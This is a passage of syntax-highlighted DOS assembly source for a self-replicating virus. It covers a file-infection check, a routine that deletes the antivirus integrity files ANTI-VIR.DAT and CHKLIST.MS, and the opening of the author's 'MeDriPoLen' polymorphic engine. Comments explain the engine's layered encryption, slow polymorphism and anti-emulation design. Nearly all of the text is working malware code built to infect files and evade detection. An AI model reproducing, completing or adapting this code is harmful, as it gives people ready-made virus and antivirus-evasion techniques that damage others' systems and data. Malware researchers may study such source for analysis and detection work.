        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Desinfeccion</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Put 0 on this field</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Infectar</span><span class="sc0">          </span><span class="sc1">; and return without Carry Flag</span><span class="sc0">
      </span><span class="sc5">@@Sigue</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0007</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Add all letters from file name in</span><span class="sc0">
      </span><span class="sc5">@@Loopeo</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AL</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">   </span><span class="sc5">@@Loopeo</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SumaNombre</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Exchange the new</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SumaNombre</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0"> </span><span class="sc1">; value with old va-</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">            </span><span class="sc1">; lue and subtract old from new</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">         </span><span class="sc1">; If result is 1 or -1, return with</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@NoInfectar</span><span class="sc0">     </span><span class="sc1">; Carry Flag</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@NoInfectar</span><span class="sc0">
</span><span class="sc5">@@Infectar</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CLC</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">@@NoInfectar</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">STC</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">CompruebaNombre</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Memory write zone</span><span class="sc0">
</span><span class="sc5">Basura17</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Procedure to delete ANTI-VIR.DAT and CHKLIST.MS</span><span class="sc0">
</span><span class="sc5">BorraDATs</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">       </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">  </span><span class="sc1">; DS:SI=Filename address</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">  </span><span class="sc1">; ES:DI=Buffer address</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">   </span><span class="sc1">; Save last segmentation on file name ("\" or</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0"> </span><span class="sc1">; ":").</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
   </span><span class="sc5">@@Loop1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LODSB</span><span class="sc0">        </span><span class="sc1">; Copy a character in both destination and AL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">  </span><span class="sc1">; AL=":"?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Sigue001</span><span class="sc0"> </span><span class="sc1">; If not, continue</span><span class="sc0">
</span><span class="sc5">@@Sigue002</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">   </span><span class="sc1">; Save position</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Loop1</span><span class="sc0">    </span><span class="sc1">; Again</span><span class="sc0">
</span><span class="sc5">@@Sigue001</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'  ; AL="\"?
</span><span class="sc0">        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Sigue002</span><span class="sc0"> </span><span class="sc1">; If it is, save position and continue</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">   </span><span class="sc1">; AL=0? (end of name)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Sigue003</span><span class="sc0"> </span><span class="sc1">; Jump and continue with the procedure</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@Loop1</span><span class="sc0">    </span><span class="sc1">; Repeat comparations with next character</span><span class="sc0">
</span><span class="sc5">@@Sigue003</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JCXZ</span><span class="sc0">  </span><span class="sc5">@@FinError</span><span class="sc0"> </span><span class="sc1">; If CX=0 (we've reached the limit), exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">   </span><span class="sc1">; Put in DI the last "\" or ":" reached</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">ArchivoDAT1</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Copy "ANTI-VIR.DAT" here</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000Dh</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">  </span><span class="sc1">; Clear file attributes</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3301h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@SigueconelOtro</span><span class="sc0">     </span><span class="sc1">; If error, do next</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">        </span><span class="sc1">; Delete file</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
</span><span class="sc5">@@SigueconelOtro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">ArchivoDAT2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Copy "CHKLIST.MS" to the</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">          </span><span class="sc1">; position where "ANTI-VIR.DAT"</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000Bh</span><span class="sc0">       </span><span class="sc1">; was copied</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3301h</span><span class="sc0">      </span><span class="sc1">; Clear its attributes</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@FinError</span><span class="sc0">       </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">        </span><span class="sc1">; Delete file</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
 </span><span class="sc5">@@FinError</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">         </span><span class="sc1">; Restore attributes</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">BorraDATs</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">ArchivoDAT1</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'ANTI-VIR.DAT'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ArchivoDAT2</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'CHKLIST.MS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;-------------------------------------------------------------------------;;;</span><span class="sc0">
</span><span class="sc1">;;;--------------P-O-L-Y-M-O-R-P-H-I-S-M-----E-N-G-I-N-E--------------------;;;</span><span class="sc0">
</span><span class="sc1">;;;-------------------------------------------------------------------------;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Initially it hasn't no name, it just was "Squatter's poly engine". But I</span><span class="sc0">
</span><span class="sc1">;; know that it would sound silly in places like VDAT. Then, I searched for a</span><span class="sc0">
</span><span class="sc1">;; name, and I found one: "MeDriPoLen", Mental Driller's Polymorphism Engine.</span><span class="sc0">
</span><span class="sc1">;; I don't know how it sounds in english, but in spanish it is a kind of joke,</span><span class="sc0">
</span><span class="sc1">;; because it's very near to "Ciripolen", a spanish "moral-upper", a kind of</span><span class="sc0">
</span><span class="sc1">;; aphrodysiac :) . So, let's redefine the title...</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;-------------------------------------------------------------------------;;;</span><span class="sc0">
</span><span class="sc1">;;;--------------------M-e-D-r-i-P-o-L-e-n-----v-0-.-1-0--------------------;;;</span><span class="sc0">
</span><span class="sc1">;;;-M-e-n-t-a-l---D-r-i-l-l-e-r-'s---P-o-l-y-m-o-r-p-h-i-s-m---E-n-g-i-n-e--;;;</span><span class="sc0">
</span><span class="sc1">;;;-------------------------------------------------------------------------;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;; I hope it'll be one of the polymorphiest engines, because, if it isn't, I'll</span><span class="sc0">
</span><span class="sc1">;; crap on anything :) (it was a hard work)</span><span class="sc0">

</span><span class="sc1">;;; Some little explanations:</span><span class="sc0">
</span><span class="sc1">;; The first decryptor that will be made is the second in order of execution.</span><span class="sc0">
</span><span class="sc1">;; More or less, the scheme of execution is:</span><span class="sc0">

</span><span class="sc1">;; $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%%%%%%%%%%</span><span class="sc0">
</span><span class="sc1">;;  VIRUS BODY (ENCRYPTED WITH 2 POLYMORPHIC     DECRYPTOR  FIRST DECRYPTOR</span><span class="sc0">
</span><span class="sc1">;;  LAYERS, WITH THE FIRST AND THE SECOND   (ENCRYPTED   (NOT ENCRYPTED)</span><span class="sc0">
</span><span class="sc1">;;  DECRYPTOR)                  WITH 1st DECRYPTOR)</span><span class="sc0">
</span><span class="sc1">;; --&gt;  --&gt;  --&gt;  --&gt;  --&gt;  --&gt;  --&gt;  --&gt;  --&gt;  --&gt;  --&gt;  --&gt;  --&gt;  --&gt;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The initial entrypoint is located on the first decryptor (but it's the se-</span><span class="sc0">
</span><span class="sc1">;; cond built by the engine).</span><span class="sc0">
</span><span class="sc1">;; The polymorphism will be always the same during 4 days and depending the</span><span class="sc0">
</span><span class="sc1">;; system (it initializes random seed using date and some values from the Inte-</span><span class="sc0">
</span><span class="sc1">;; rrupt Vector Table), so the virus can be qualificated like "slow polymor-</span><span class="sc0">
</span><span class="sc1">;; phic".</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The construction of a decryptor follows a Flag Register (BP), where a kind</span><span class="sc0">
</span><span class="sc1">;; of configuration bits are used to make the decryptor. This flags are like</span><span class="sc0">
</span><span class="sc1">;; it follows:</span><span class="sc0">

</span><span class="sc1">;;  Bit 0: Count number of loops: 0:Decreasing counter, 1:Increasing it</span><span class="sc0">
</span><span class="sc1">;;  Bit 1: Add a word value to the index register (for example, [BX+459D]):</span><span class="sc0">
</span><span class="sc1">;;     0: NO, 1: YES</span><span class="sc0">
</span><span class="sc1">;;  Bit 2: Modify key of decryption every loop: 0:NO, 1:YES</span><span class="sc0">
</span><span class="sc1">;;  Bits 3 and 4: Method of decryption:</span><span class="sc0">
</span><span class="sc1">;;         0 and 0:XOR;  0 and 1:ADD;  1 and 0:SUB;  1 and 1:XOR</span><span class="sc0">
</span><span class="sc1">;;  Bits 5 and 6: If 4th bit is set, then modify key with a:</span><span class="sc0">
</span><span class="sc1">;;         0 and 0:XOR;  0 and 1:ADD;  1 and 0:SUB;  1 and 1:ROL,1</span><span class="sc0">
</span><span class="sc1">;;  Bit 7: Encrypt by 0=word, 1=byte</span><span class="sc0">
</span><span class="sc1">;;  Bit 8: 0: Don't use register to decrypt (direct value decrypting)</span><span class="sc0">
</span><span class="sc1">;;     1: Use register to decrypt (decrypt key in a register)</span><span class="sc0">
</span><span class="sc1">;;  Bit 9: If it decrypts by register AND register is ?X AND it decrypts byte</span><span class="sc0">
</span><span class="sc1">;;     to byte then:</span><span class="sc0">
</span><span class="sc1">;;     0: Use low byte of register (?L), 1:Use high byte of register (?H)</span><span class="sc0">
</span><span class="sc1">;;  Bits 10 and 11: Use next method to jump to next decryptor or to virus body:</span><span class="sc0">
</span><span class="sc1">;;          0 and 0: JMP</span><span class="sc0">
</span><span class="sc1">;;          0 and 1: RET</span><span class="sc0">
</span><span class="sc1">;;          1 and 0: REFT or RET 2</span><span class="sc0">
</span><span class="sc1">;;          1 and 1: IRET, RETF 2 or RET 4</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  Bits 13 and 14: If the counter register is CX AND register is decreased in</span><span class="sc0">
</span><span class="sc1">;;          every decryption loop, then:</span><span class="sc0">
</span><span class="sc1">;;          0 and 0: Don't use any LOOP instruction like below</span><span class="sc0">
</span><span class="sc1">;;          0 and 1: Use LOOPNZ to loop</span><span class="sc0">
</span><span class="sc1">;;          1 and 0: Use LOOPZ to loop</span><span class="sc0">
</span><span class="sc1">;;          1 and 1: Use LOOP to loop</span><span class="sc0">
</span><span class="sc1">;;  Bit 15: Unused (maybe set in future versions)</span><span class="sc0">

</span><span class="sc1">;; Note that this engine takes about 4 Kb, so it's HUGE. Only the engine</span><span class="sc0">
</span><span class="sc1">;; takes as size as a polymorphic multipartite full-stealth virus :) . Exactly,</span><span class="sc0">
</span><span class="sc1">;; its size is 4216 bytes (52.7% of the virus)</span><span class="sc0">

</span><span class="sc5">HazVirus</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">  </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AntiEmulacion</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">; Set to non 0</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InstalacionPoli</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Initialize random</span><span class="sc0">
                               </span><span class="sc1">; seed?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@NoInicAleatorio</span><span class="sc0">   </span><span class="sc1">; If not 0, don't initialize</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">InicAleatorio</span><span class="sc0">     </span><span class="sc1">; Initialize random seed</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">       </span><span class="sc1">; Save EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio1</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Save random seed</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AntAleatorio</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">  </span><span class="sc1">; to use it in ano-</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ther infection</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AntAleatorio</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; (slow poly.)</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InstalacionPoli</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set to non 0</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@SiInicAleatorio</span><span class="sc0">
</span><span class="sc5">@@NoInicAleatorio</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">       </span><span class="sc1">; Recover last random seed. Every infec-</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AntAleatorio</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; tion, until next</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio1</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc1">; intallation of</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AntAleatorio</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; the virus in memo-</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordAleatorio3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; ry, the polymor-</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">               </span><span class="sc1">; phism doesn't change</span><span class="sc0">
</span><span class="sc5">@@SiInicAleatorio</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; AX=Initial delta-offset</span><span class="sc0">
                </span><span class="sc1">; Set counter size on second decryptor</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TamanyoContador</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LongVirus</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NumeroCALLs</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;Initialize amount of</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                        </span><span class="sc1">; CALLs</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">  </span><span class="sc1">; Copy virus in memory to "NewVirus"</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LongDesencrip</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Second decryptor (if</span><span class="sc0">
                        </span><span class="sc1">; it were the first, it won't be 0)</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazVirus2</span><span class="sc0">       </span><span class="sc1">; Generate decryptor in ES:DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LongDesencrip</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Encrypt the virus body using</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus</span><span class="sc0">        </span><span class="sc1">; the random values generated</span><span class="sc0">
